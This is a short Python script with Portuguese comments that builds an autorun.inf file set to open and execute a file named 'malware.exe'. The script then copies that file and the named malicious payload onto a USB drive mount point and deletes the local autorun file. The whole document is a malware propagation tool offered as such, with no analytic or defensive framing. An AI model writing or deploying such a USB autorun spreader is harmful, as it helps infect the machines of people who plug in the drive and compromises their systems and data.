import os

# Nome do arquivo malicioso
nome_arquivo = "malware.exe"

# Caminho para o arquivo malicioso
caminho_arquivo = "/caminho/para/arquivo/{}".format(nome_arquivo)

# Cria o arquivo autorun.inf
with open("autorun.inf", "w") as f:
    f.write("[Autorun]\n")
    f.write("Open={}\n".format(nome_arquivo))
    f.write("Action=Execute {}\n".format(nome_arquivo))

# Copia o arquivo autorun.inf e o arquivo malicioso para o pen drive
os.system("cp autorun.inf /media/pen-drive/")
os.system("cp {} /media/pen-drive/".format(caminho_arquivo))

# Remove os arquivos da máquina local
os.remove("autorun.inf")
